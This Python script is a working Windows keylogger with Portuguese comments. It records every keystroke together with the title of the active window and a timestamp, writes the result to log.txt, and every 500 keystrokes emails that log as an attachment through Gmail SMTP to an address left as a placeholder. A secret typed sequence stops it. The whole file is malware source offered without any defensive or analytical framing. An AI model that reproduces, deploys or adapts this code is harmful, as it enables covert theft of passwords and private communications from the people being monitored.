from pynput.keyboard import Key, Listener
from collections import deque
from win32gui import GetWindowText, GetForegroundWindow
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

password = ["1", "2", "g", "4", "t"] #cria uma senha
tela = ""
keys = deque(maxlen=5) #cria um array para salvar as ultimas 5 letras (uso para comparar com a senha)
tempoExecucao = 0

def email():
    try:

        # Configuração
        host = 'smtp.gmail.com'
        port = 587
        user = "email que envia o log"
        password = 'senha do email que vai enviar'

        # Criando objeto
        server = smtplib.SMTP(host, port)

        # Login com servidor
        server.ehlo()
        server.starttls()
        server.login(user, password)

        # Criando mensagem
        message = 'key'
        email_msg = MIMEMultipart()
        email_msg['From'] = user
        email_msg['To'] = 'email de destino'
        email_msg['Subject'] = 'Keylogger'
        email_msg.attach(MIMEText(message, 'plain'))

        filename = 'log.txt'
        filepath = 'log.txt'
        attachment = open(filepath, 'rb')

        att = MIMEBase('application', 'octet-stream')
        att.set_payload(attachment.read())
        encoders.encode_base64(att)
        att.add_header('Content-Disposition', f'attachment; filename= {filename}')

        attachment.close()
        email_msg.attach(att)

        # Enviando mensagem
        server.sendmail(email_msg['From'], email_msg['To'], email_msg.as_string())
        server.quit()

    except:
        return

email()

def escrever(text): #abre o txt e salva o que foi digitado
    with open("log.txt", "a") as file_log:
        file_log.write(text)


def monitor(Key):    
    telaAtual = GetWindowText(GetForegroundWindow()) #captura o programa usado
    global tela
    global tempoExecucao
    tempoExecucao = tempoExecucao + 1  

    if tempoExecucao >= 500:
        email()
        tempoExecucao = 0  
    
    if(tela != telaAtual):
        data_e_hora_atuais = datetime.now()
        data_e_hora_em_texto = data_e_hora_atuais.strftime("%d/%m/%Y %H:%M")          
        tela = telaAtual
        escrever('\n\r ----------------------' + tela + " ==> " + data_e_hora_em_texto + ' ---------------------- \n\r')        
    
    try:
        escrever(Key.char)
        keys.append(Key.char)
    except AttributeError:
        if Key == Key.space:
            escrever(" ")
        else:
            escrever(" <" + str(Key) + "> ")
        keys.append(str(Key))
    if "".join(password) == "".join(keys): #verifica se a senha foi digitada e encerra o programa
        return False
    
with Listener(on_release=monitor) as listener: #metodo para capturar as teclas pressiondas
    listener.join()

    

